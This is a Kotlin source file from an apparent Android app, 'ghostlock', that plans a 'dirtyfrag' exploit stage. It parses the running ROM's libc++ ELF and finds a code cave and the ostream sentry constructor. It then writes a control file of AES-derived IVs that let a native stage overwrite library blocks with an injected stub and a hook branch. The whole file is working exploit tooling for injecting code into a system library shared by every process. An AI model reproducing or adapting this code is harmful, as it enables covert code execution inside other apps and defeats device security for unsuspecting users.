package com.ghostlock.app.data

import android.content.Context
import java.io.File
import java.io.RandomAccessFile
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

/**
 * Builds the second way's control file: the 16-byte blocks of libc++ that carry
 * the init stub (the cave) and the branch at the sentry constructor, plus the
 * blocks that restore them. Every IV is computed here — IV = AES_ECB_DEC(key,
 * current_block) XOR desired_block — so the native stage only splices and sends.
 *
 * The layout constants are those of assets/dirtyfrag_stub.bin (the prototype in
 * the private repo: stub.S, 420 bytes).
 */
object DirtyfragPlan {
    private const val STUB_ASSET = "dirtyfrag_stub.bin"
    private const val STUB_NAME_OFFSET = 3
    private const val STUB_CODE_OFFSET = 0x4c
    private const val STUB_FIRST_INS_OFFSET = 0x19c
    private const val STUB_RETURN_OFFSET = 0x1a0
    private const val CAVE_PAGE_BYTES = 0x1000L
    private const val SENTRY_SYMBOL =
        "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_"

    private class Segment(
        val offset: Long,
        val vaddr: Long,
        val filesz: Long,
        val flags: Int,
    )

    private class Block(val base: Long, val current: ByteArray, val desired: ByteArray)

    /** The ELF facts the cave check needs, independent of the stub/key. */
    internal data class CaveLayout(
        val execOffset: Long,
        val execFilesz: Long,
        val hook: Long,
        val fileLength: Long,
    )

    /** Structural preflight of the running ROM's libc++ for the stage. */
    internal data class DirtyfragPreflight(
        val feasible: Boolean,
        val reasons: List<String>,
        val details: String,
    )

    /**
     * The pure cave/layout rules. The cave is the byte after the executable
     * segment's file data, inside that segment's **last 4 KiB page**: the
     * loader's executable mapping of that page is what runs the stub, so the
     * blob must fit the page remainder (the 420 B stub against the stage-1
     * 2520/640 B margins). The RW segment's bytes share the same page-cache
     * page by design (its `.data.rel.ro` alias is COWed in live processes), so
     * a shared page is not an error; a cave at a page boundary has no
     * executable page and is rejected. Both branch displacements must fit the
     * ARM64 B range.
     */
    internal fun checkCave(layout: CaveLayout, blobSize: Int): List<String> {
        val reasons = mutableListOf<String>()
        val cave = layout.execOffset + layout.execFilesz
        val caveEnd = cave + blobSize
        if (cave < 0 || caveEnd > layout.fileLength) {
            reasons += "cave outside the file (cave=$cave end=$caveEnd file=${layout.fileLength})"
        }
        if (layout.hook < 0 || layout.hook + 4 > layout.fileLength) {
            reasons += "hook outside the file (hook=${layout.hook} file=${layout.fileLength})"
        }
        val pageOffset = cave and (CAVE_PAGE_BYTES - 1)
        if (pageOffset == 0L) {
            reasons += "cave starts at a page boundary; no executable page for the stub"
        } else {
            val remain = CAVE_PAGE_BYTES - pageOffset
            if (remain < blobSize) {
                reasons += "cave page remainder $remain < stub $blobSize"
            }
        }
        if (!branchFits(layout.hook, cave + STUB_CODE_OFFSET)) {
            reasons += "hook branch out of range"
        }
        if (!branchFits(cave + STUB_RETURN_OFFSET, layout.hook + 4)) {
            reasons += "return branch out of range"
        }
        return reasons
    }

    internal fun branchFits(from: Long, to: Long): Boolean {
        val delta = to - from
        return delta % 4 == 0L && delta >= -(1L shl 27) && delta < (1L shl 27)
    }

    /** Structural check of the running ROM's libc++; callable before W1. */
    internal fun preflight(context: Context, lib: File): DirtyfragPreflight {
        val reasons = mutableListOf<String>()
        var details = ""
        try {
            val blob = context.assets.open(STUB_ASSET).use { it.readBytes() }
            if (blob.size < STUB_RETURN_OFFSET + 4) {
                reasons += "stub asset truncated (${blob.size} B)"
            }
            RandomAccessFile(lib, "r").use { elf ->
                val segments = loadSegments(elf)
                val exec = execSegment(segments)
                val hook = hookOffset(elf, exec)
                val cave = exec.offset + exec.filesz
                val layout = CaveLayout(exec.offset, exec.filesz, hook, elf.length())
                reasons += checkCave(layout, blob.size)
                readInt(elf, hook)
                val remain = CAVE_PAGE_BYTES - (cave and (CAVE_PAGE_BYTES - 1))
                details = "lib=${lib.absolutePath} cave=$cave page_remain=$remain " +
                    "blob=${blob.size} hook=$hook file=${elf.length()}"
            }
        } catch (t: Throwable) {
            reasons += "${t::class.simpleName}: ${t.message}"
        }
        return DirtyfragPreflight(reasons.isEmpty(), reasons, details)
    }

    /** Writes the control file and returns it. */
    fun build(
        context: Context,
        lib: File,
        key: ByteArray,
        spi: Int,
        senderPort: Int,
        encapPort: Int,
        socketName: String,
        out: File,
    ): File {
        require(key.size == 32) { "AES-256 key must be 32 bytes" }
        require(socketName.length == 8) { "abstract socket name must be 8 bytes" }
        RandomAccessFile(lib, "r").use { elf ->
            val exec = execSegment(loadSegments(elf))
            val hook = hookOffset(elf, exec)
            val cave = exec.offset + exec.filesz
            val blob = context.assets.open(STUB_ASSET).use { it.readBytes() }
            require(blob.size >= STUB_RETURN_OFFSET + 4) { "stub asset truncated" }

            System.arraycopy(socketName.toByteArray(Charsets.US_ASCII), 0, blob, STUB_NAME_OFFSET, 8)
            putInt(blob, STUB_FIRST_INS_OFFSET, readInt(elf, hook))
            putInt(blob, STUB_RETURN_OFFSET, branch(cave + STUB_RETURN_OFFSET, hook + 4))
            val hookBranch = branch(hook, cave + STUB_CODE_OFFSET)

            val patches = ArrayList<Block>()
            // Cave blocks: the stub blob, 16-byte read-modify-write.
            var base = cave and 15L.inv()
            while (base < cave + blob.size) {
                val current = readBlock(elf, base)
                val desired = current.copyOf()
                for (j in 0 until 16) {
                    val index = base + j - cave
                    if (index >= 0 && index < blob.size) desired[j] = blob[index.toInt()]
                }
                patches += Block(base, current, desired)
                base += 16
            }
            // The hook block: replace the 4 bytes after the prologue preamble.
            val hookBase = hook and 15L.inv()
            val hookCurrent = readBlock(elf, hookBase)
            val hookDesired = hookCurrent.copyOf()
            putInt(hookDesired, (hook - hookBase).toInt(), hookBranch)
            patches += Block(hookBase, hookCurrent, hookDesired)

            out.bufferedWriter().use { writer ->
                writer.appendLine("lib ${lib.absolutePath}")
                writer.appendLine("sender $senderPort")
                writer.appendLine("encap $encapPort")
                writer.appendLine("spi ${Integer.toUnsignedString(spi)}")
                writer.appendLine("socket $socketName")
                for (block in patches) {
                    writer.appendLine("patch ${block.base} ${hex(ivFor(key, block.current, block.desired))}")
                }
                for (block in patches) {
                    writer.appendLine(
                        "restore ${block.base} ${hex(ivFor(key, block.desired, block.current))}",
                    )
                }
            }
        }
        return out
    }

    private fun ivFor(key: ByteArray, current: ByteArray, desired: ByteArray): ByteArray {
        val cipher = Cipher.getInstance("AES/ECB/NoPadding")
        cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(key, "AES"))
        val decrypted = cipher.doFinal(current)
        return ByteArray(16) { i -> (decrypted[i].toInt() xor desired[i].toInt()).toByte() }
    }

    private fun loadSegments(elf: RandomAccessFile): List<Segment> {
        elf.seek(0x20)
        val phoff = readLong(elf)
        elf.seek(0x36)
        val phentsize = readShort(elf).toInt()
        val phnum = readShort(elf).toInt()
        val segments = ArrayList<Segment>(phnum)
        for (i in 0 until phnum) {
            elf.seek(phoff + i.toLong() * phentsize)
            val type = readInt(elf)
            val flags = readInt(elf)
            val offset = readLong(elf)
            val vaddr = readLong(elf)
            readLong(elf) // p_paddr
            val filesz = readLong(elf)
            if (type == 1) segments += Segment(offset, vaddr, filesz, flags)
        }
        return segments
    }

    private fun execSegment(segments: List<Segment>): Segment =
        segments.firstOrNull { it.flags and 1 != 0 }
            ?: error("no executable PT_LOAD")

    private fun hookOffset(elf: RandomAccessFile, exec: Segment): Long {
        elf.seek(0x28)
        val shoff = readLong(elf)
        elf.seek(0x3a)
        val shentsize = readShort(elf).toInt()
        elf.seek(0x3c)
        val shnum = readShort(elf).toInt()
        elf.seek(0x3e)
        val shstrndx = readShort(elf).toInt()

        fun sectionOffset(index: Int): Long {
            // Elf64_Shdr: sh_name(4) sh_type(4) sh_flags(8) sh_addr(8) sh_offset(8)
            elf.seek(shoff + index.toLong() * shentsize + 8L)
            readLong(elf) // sh_flags
            readLong(elf) // sh_addr
            return readLong(elf) // sh_offset
        }

        val shstr = sectionOffset(shstrndx)
        var dynsymOffset = -1L
        var dynsymSize = 0L
        var dynstrOffset = -1L
        for (i in 0 until shnum) {
            elf.seek(shoff + i.toLong() * shentsize)
            val nameOffset = readInt(elf)
            readInt(elf) // sh_type
            readLong(elf) // sh_flags
            readLong(elf) // sh_addr
            val offset = readLong(elf)
            val size = readLong(elf)
            readInt(elf) // sh_link
            readInt(elf) // sh_info
            readLong(elf) // sh_addralign
            readLong(elf) // sh_entsize
            val name = readCString(elf, shstr + nameOffset)
            if (name == ".dynsym") {
                dynsymOffset = offset
                dynsymSize = size
            } else if (name == ".dynstr") {
                dynstrOffset = offset
            }
        }
        require(dynsymOffset >= 0 && dynstrOffset >= 0) { "no .dynsym/.dynstr" }

        var hook = -1L
        for (i in 0 until (dynsymSize / 24).toInt()) {
            elf.seek(dynsymOffset + i.toLong() * 24)
            val stName = readInt(elf)
            readInt(elf) // st_info/st_other/st_shndx packed as 2 ints
            val stValue = readLong(elf)
            readLong(elf) // st_size
            if (readCString(elf, dynstrOffset + stName) == SENTRY_SYMBOL) {
                hook = stValue - exec.vaddr + exec.offset
                break
            }
        }
        require(hook >= 0) { "sentry symbol not found" }

        // Skip a BTI/PAC preamble: the hook replaces the first real instruction.
        while (true) {
            val word = readInt(elf, hook)
            if (word in PREAMBLES) {
                hook += 4
            } else {
                break
            }
        }
        return hook
    }

    private fun readBlock(elf: RandomAccessFile, base: Long): ByteArray {
        val block = ByteArray(16)
        elf.seek(base)
        elf.readFully(block)
        return block
    }

    private fun readCString(elf: RandomAccessFile, offset: Long): String {
        elf.seek(offset)
        val bytes = ArrayList<Byte>(24)
        while (true) {
            val b = elf.read()
            if (b <= 0 || b == 0) break
            bytes += b.toByte()
            if (bytes.size >= 200) break
        }
        return String(bytes.toByteArray(), Charsets.US_ASCII)
    }

    private fun readInt(elf: RandomAccessFile): Int {
        val bytes = ByteArray(4)
        elf.readFully(bytes)
        return (bytes[0].toInt() and 0xff) or
            ((bytes[1].toInt() and 0xff) shl 8) or
            ((bytes[2].toInt() and 0xff) shl 16) or
            ((bytes[3].toInt() and 0xff) shl 24)
    }

    private fun readInt(elf: RandomAccessFile, offset: Long): Int {
        elf.seek(offset)
        return readInt(elf)
    }

    private fun readShort(elf: RandomAccessFile): Short {
        val bytes = ByteArray(2)
        elf.readFully(bytes)
        return (((bytes[0].toInt() and 0xff) or ((bytes[1].toInt() and 0xff) shl 8)).toShort())
    }

    private fun readLong(elf: RandomAccessFile): Long {
        val bytes = ByteArray(8)
        elf.readFully(bytes)
        var value = 0L
        for (i in 7 downTo 0) value = (value shl 8) or (bytes[i].toLong() and 0xff)
        return value
    }

    private fun putInt(target: ByteArray, offset: Int, value: Int) {
        target[offset] = value.toByte()
        target[offset + 1] = (value shr 8).toByte()
        target[offset + 2] = (value shr 16).toByte()
        target[offset + 3] = (value shr 24).toByte()
    }

    private fun branch(from: Long, to: Long): Int {
        require(branchFits(from, to)) { "branch out of range: ${to - from}" }
        val delta = (to - from).toInt()
        return 0x14000000.toInt() or ((delta shr 2) and 0x03FFFFFF)
    }

    private fun hex(bytes: ByteArray): String = buildString {
        for (b in bytes) append(String.format("%02x", b.toInt() and 0xff))
    }

    private val PREAMBLES = setOf(
        0xd503233f.toInt(), // PACIASP
        0xd503237f.toInt(), // PACIBSP
        0xd503241f.toInt(), // BTI
        0xd503245f.toInt(), // BTI c
        0xd503249f.toInt(), // BTI j
        0xd50324df.toInt(), // BTI jc
    )
}
